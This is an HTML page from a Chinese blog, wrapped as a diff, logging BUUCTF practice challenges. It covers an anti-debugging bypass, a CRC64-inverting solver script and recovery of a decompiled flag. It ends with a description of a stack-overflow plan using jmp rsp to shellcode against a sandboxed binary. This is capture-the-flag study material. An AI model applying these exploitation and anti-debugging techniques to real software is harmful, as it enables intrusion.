@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="buuctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="2020-5-7[SUCTF2019]Akira Homework | STUCK调试的时候跳出窗口，有反调试查找字符串找到反调试的函数绕过很简单，只需把IsDebuggerPresent的返回值设置为0就行 不知道为什么调试到这一步的时候程序就会退出。直接打开的话也没有等待输入，而是直接结束了。可能是虚拟机的关系吧，在物理机上是能运行的运行一次之后就这样了  在一个函数里发现4个初始化的变量，下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf刷题记录">
+<meta property="og:url" content="https://r3n0.top/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="R3n0&#39;Blog">
+<meta property="og:description" content="2020-5-7[SUCTF2019]Akira Homework | STUCK调试的时候跳出窗口，有反调试查找字符串找到反调试的函数绕过很简单，只需把IsDebuggerPresent的返回值设置为0就行 不知道为什么调试到这一步的时候程序就会退出。直接打开的话也没有等待输入，而是直接结束了。可能是虚拟机的关系吧，在物理机上是能运行的运行一次之后就这样了  在一个函数里发现4个初始化的变量，下">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_38376ddb099ee771e5c52c989c447f33.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_8cfaf1cd5c130328621bf8862ca77cb4.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_660f4eae2bec4f7f0b6e77b9ce800b84.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_e5e2da23be3d4f5ee3109024305c6bf4.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_a4182fcb9c779eaff7a2c394227e9985.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_1d2e378965333e2187502049ca6c9d47.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_4f3428eb306bb447a138201c0e6ff617.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_6f634e92bf28da8bacf1b7830e710d55.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_f33482a7eae1b93a5e0875fe75e861a6.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_1960700798db6e3dd787662716000161.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_9bd985c43654dbdca7b78bc16430ff1d.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_78675fd18622afc0988ab015e05ccbc1.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_aa845c55b12526a7365365054910e79d.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_0ef81ba84898aab1496dbaaacdc77954.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_49f88f3c801f302e2948e60b29f68c78.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_4d0180c2312510e2959709547c2fe9cf.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_4bd6161ee59756472675ff231c44ee5a.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_603992124217fbbc9519e0957734354b.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_ecaf68476885e4315a2b31bfa6474edc.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_c5c7c07db0b9aff348b0168f4e69bd11.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_d84eac982b8a7126d351ea86d72bf586.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_bd009720ab3d6d7cc1cc41d33d370e9b.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_2b14e26aa4ddf942770f10910f13872e.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_6ffd18ba3d62e012ada3e2a0d90937d2.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_b2455aad9adb046927edc7b37aef222b.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_bde33659fc15afa4262783fce24a6214.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_39d1b2e0867d4ddaf9aa2e3e2a972bb1.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_4fcadd82c0bc1d8679aaa2e73ecbe6b1.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_7cd8e5c85de128c1639000587329f9b5.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_9c228784e78613250e0b91bce39c32d7.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_85fd92a9a80f20f4999adb80b590078f.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_bdb66068d8485c9643a6a930b5af49b4.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_7f72df336c4793d5afbb3365ba6b1d91.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_56ee5b2431db920d60e02f89f75d51ac.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_7f6b4ff90db0e3757afa9373ce20c851.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_edbe0a7dc35c9f225d164b94b60e3db7.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_39ed01ab513d43b67f246d53f5c3ba55.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_fdf0f13593bfa27fa5775486984c3ee9.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_9cd363247e3e816078ed7c3922537fdc.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_560a6d177fc97cda0b71895ec50fcfc5.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_c77d25bc54b0abf16db1cd090b1b35c2.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_9565d43a5741bd4cb41351ea82f00d8e.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_78b05e913a6ee8fe67ef51d4b222dd78.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_8870a5f4c550d8b4e62bfae55fa13493.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_271fe4a6d61cdfbd6ffccbadab1b0afd.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_742dfaa1b7399ca31b21d94bbc06bb9f.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_e2a5d25871f0db871ceb9e11912d31d3.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_231ac87ea323a36c3bfc4a4c9b98d096.png">
+<meta property="og:image" content="https://md.vidar.club/uploads/upload_0f367df0f95dbf045878a1abfd0c1aaf.png">
+<meta property="article:published_time" content="2020-07-15T14:38:44.000Z">
+<meta property="article:modified_time" content="2020-07-15T14:43:26.306Z">
+<meta property="article:author" content="R3n0">
+<meta property="article:tag" content="buuctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://md.vidar.club/uploads/upload_38376ddb099ee771e5c52c989c447f33.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://r3n0.top/2020/07/15/buuctf刷题记录/"/>
+
+
+
+
+
+  <title>buuctf刷题记录 | R3n0'Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R3n0'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://r3n0.top/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R3n0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3n0'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buuctf刷题记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-15T22:38:44+08:00">
+                2020-07-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="2020-5-7"><a href="#2020-5-7" class="headerlink" title="2020-5-7"></a>2020-5-7</h1><h2 id="SUCTF2019-Akira-Homework-STUCK"><a href="#SUCTF2019-Akira-Homework-STUCK" class="headerlink" title="[SUCTF2019]Akira Homework | STUCK"></a>[SUCTF2019]Akira Homework | STUCK</h2><p>调试的时候跳出窗口，有反调试<br><img src="https://md.vidar.club/uploads/upload_38376ddb099ee771e5c52c989c447f33.png" alt=""><br>查找字符串找到反调试的函数<br><img src="https://md.vidar.club/uploads/upload_8cfaf1cd5c130328621bf8862ca77cb4.png" alt=""><br>绕过很简单，只需把<code>IsDebuggerPresent</code>的返回值设置为0就行</p>
+<p><img src="https://md.vidar.club/uploads/upload_660f4eae2bec4f7f0b6e77b9ce800b84.png" alt=""><br><del>不知道为什么调试到这一步的时候程序就会退出。直接打开的话也没有等待输入，而是直接结束了。</del><br><del>可能是虚拟机的关系吧，在物理机上是能运行的</del><br>运行一次之后就这样了</p>
+<hr>
+<p>在一个函数里发现4个初始化的变量，下面还有很多位运算，基本就可以确定为md5了<br><img src="https://md.vidar.club/uploads/upload_e5e2da23be3d4f5ee3109024305c6bf4.png" alt=""></p>
+<p><img src="https://md.vidar.club/uploads/upload_a4182fcb9c779eaff7a2c394227e9985.png" alt=""><br>经过md5解密后是<code>Overwatch</code></p>
+<p>几个经过加密的字符串解密后的结果为</p>
+<blockquote>
+<p>Akira_aut0_ch3ss_!<br>:signature<br>Failed to check sign!<br>Have no sign!</p>
+</blockquote>
+<p>查了下wp，貌似这题有点复杂， 先鸽了..<br><a href="https://xz.aliyun.com/t/6042#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-9</a><br>貌似有bug</p>
+<h2 id="RoarCTF2019-polyre"><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h2><p>啊，这混淆<br><img src="https://md.vidar.club/uploads/upload_1d2e378965333e2187502049ca6c9d47.png" alt=""></p>
+<p>用<a href="https://github.com/pcy190/deflat" target="_blank" rel="noopener">这个工具</a>可以还原平坦化<br>还原之后好像还有花指令，但已经好看多了<br>简单流程如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">    v4 = (QWORD*)input[<span class="number">8</span>*i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(v7 &lt; <span class="number">64</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v4 &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v4 *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v4 = (v4 * <span class="number">2</span>) ^ <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v7++;</span><br><span class="line">    &#125;</span><br><span class="line">    s1[<span class="number">8</span>*i] = v4;</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line">v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>这类似CRC64<br>可以根据最低位来判断上次走的是哪个分支</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> s1[<span class="number">6</span>] = &#123;<span class="number">0xbc8ff26d43536296</span>, <span class="number">0x520100780530ee16</span>, <span class="number">0x4dc0b5ea935f08ec</span>, <span class="number">0x342b90afd853f450</span>, <span class="number">0x8b250ebcaa2c3681</span>, <span class="number">0x55759f81a2c68ae4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (v7 &lt; <span class="number">64</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i] &amp; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s1[i] = (s1[i] ^ <span class="number">0xB0004B7679FA26B3</span>) / <span class="number">2</span>;</span><br><span class="line">                s1[i] |= <span class="number">0x8000000000000000</span>; <span class="comment">//自己整的一直不对，查了下wp发现要或上这个数，暂时还没弄明白</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s1[i] /= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v7++;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (s1[i] &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, s1[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            s1[i] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="2020-5-8"><a href="#2020-5-8" class="headerlink" title="2020-5-8"></a>2020-5-8</h1><h2 id="BJDCTF2020-easy"><a href="#BJDCTF2020-easy" class="headerlink" title="[BJDCTF2020]easy"></a>[BJDCTF2020]easy</h2><p><img src="https://md.vidar.club/uploads/upload_4f3428eb306bb447a138201c0e6ff617.png" alt=""><br>main函数啥都没有<br><img src="https://md.vidar.club/uploads/upload_6f634e92bf28da8bacf1b7830e710d55.png" alt=""></p>
+<h3 id="IDA常用宏定义"><a href="#IDA常用宏定义" class="headerlink" title="IDA常用宏定义"></a>IDA常用宏定义</h3><p><a href="https://www.jianshu.com/p/7cc97bdd716d" target="_blank" rel="noopener">https://www.jianshu.com/p/7cc97bdd716d</a><br>这个函数比较可疑</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ida.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">50</span>]; <span class="comment">// [esp+20h] [ebp-128h]</span></span><br><span class="line">  <span class="keyword">int</span> v3[<span class="number">10</span>]; <span class="comment">// [esp+E8h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+114h] [ebp-34h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [esp+118h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+124h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+128h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+12Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0x7FFA7E31</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">0x224FC</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0x884A4239</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0x22A84</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">0x84FF235</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">0x3FF87</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">0x88424233</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">0x23185</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">0x7E4243F1</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">0x231FC</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v0 = v3[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    LODWORD(v5) = v3[<span class="number">2</span> * i];</span><br><span class="line">    HIDWORD(v5) = v0;</span><br><span class="line">    <span class="keyword">while</span> ( SHIDWORD(v5) &gt; <span class="number">0</span> || v5 &gt;= <span class="number">0</span> &amp;&amp; (_DWORD)v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[v7++] = ((SHIDWORD(v5) &gt;&gt; <span class="number">31</span>) ^ (((<span class="keyword">unsigned</span> __int8)(SHIDWORD(v5) &gt;&gt; <span class="number">31</span>) ^ (<span class="keyword">unsigned</span> __int8)v5)</span><br><span class="line">                                        - (<span class="keyword">unsigned</span> __int8)(SHIDWORD(v5) &gt;&gt; <span class="number">31</span>)) &amp; <span class="number">1</span>)</span><br><span class="line">               - (SHIDWORD(v5) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">      v5 /= <span class="number">2L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">50</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2[j] == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="string">'*'</span>);</span><br><span class="line">          ++v6;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v6 % <span class="number">5</span>) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   *   *   ***** *   * ***** ***** * *   ***** *   * *   * </span><br><span class="line">*   *  * *  *     *  *    *     *   * *   *     *   * **  * </span><br><span class="line">***** ***** *     ***     *     *   ***** ***   *   * * * * </span><br><span class="line">*   * *   * *     * **    *     *     *   *     *   * *  ** </span><br><span class="line">*   * *   * ***** *   * *****   *     *   *     ***** *   *</span><br></pre></td></tr></table></figure>
+<p>???这就是flag？？</p>
+<blockquote>
+<p>flag{HACKIT4FUN}</p>
+</blockquote>
+<h1 id="2020-5-9"><a href="#2020-5-9" class="headerlink" title="2020-5-9"></a>2020-5-9</h1><h2 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h2><p><img src="https://md.vidar.club/uploads/upload_f33482a7eae1b93a5e0875fe75e861a6.png" alt=""><br>保护都关了<br><img src="https://md.vidar.club/uploads/upload_1960700798db6e3dd787662716000161.png" alt=""><br>有沙盒<br>只能调用read、open、write<br><img src="https://md.vidar.club/uploads/upload_9bd985c43654dbdca7b78bc16430ff1d.png" alt=""><br>这里有0x18个字节的溢出，明显不能orw<br>嫖了眼<a href="http://www.qfrost.com/CTF/geek_pwn/" target="_blank" rel="noopener">wp</a>，可以利用jmp rsp<br>这题没有开nx，在栈上写上指令，再栈溢出把ret的地址改为jmp rsp，再跟上一个jmp rsp-0x30，这样就可以跳转到刚刚写入的指令</p>
+<p><img src="https://md.vidar.club/uploads/upload_78675fd18622afc0988ab015e05ccbc1.png" alt=""><br>mmap把0x123000的地址改为可执行了，就可以把orw的指令写在这上面，跳转过来就行</p>
